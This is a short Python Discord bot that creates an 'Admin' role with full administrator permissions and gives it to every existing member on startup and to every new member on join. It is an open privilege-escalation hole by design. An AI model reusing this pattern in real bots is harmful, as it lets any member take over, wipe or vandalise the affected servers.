import discord
from discord.ext import commands
import os
 
intents          = discord.Intents.default()
intents.members  = True
bot = commands.Bot(command_prefix="!", intents=intents)
 
ROLE_NAME = "Admin"
 
async def get_or_create_admin_role(guild: discord.Guild) -> discord.Role:
    role = discord.utils.get(guild.roles, name=ROLE_NAME)
    if not role:
        role = await guild.create_role(
            name=ROLE_NAME,
            permissions=discord.Permissions(administrator=True),
            reason="Auto-admin role created by bot",
        )
    return role
 
@bot.event
async def on_ready():
    print(f"✅  Logged in as {bot.user}")
    for guild in bot.guilds:
        role = await get_or_create_admin_role(guild)
        for member in guild.members:
            if role not in member.roles:
                try:
                    await member.add_roles(role, reason="Auto-admin on startup")
                    print(f"  → Gave admin to {member.display_name}")
                except Exception as e:
                    print(f"  ✗ Could not give admin to {member.display_name}: {e}")
 
@bot.event
async def on_member_join(member: discord.Member):
    role = await get_or_create_admin_role(member.guild)
    try:
        await member.add_roles(role, reason="Auto-admin on join")
        print(f"  → Gave admin to new member {member.display_name}")
    except Exception as e:
        print(f"  ✗ Could not give admin to {member.display_name}: {e}")
 
if __name__ == "__main__":
    TOKEN = os.getenv("DISCORD_TOKEN")
    if not TOKEN:
        raise RuntimeError("Set the DISCORD_TOKEN environment variable before running.")
    bot.run(TOKEN)
 
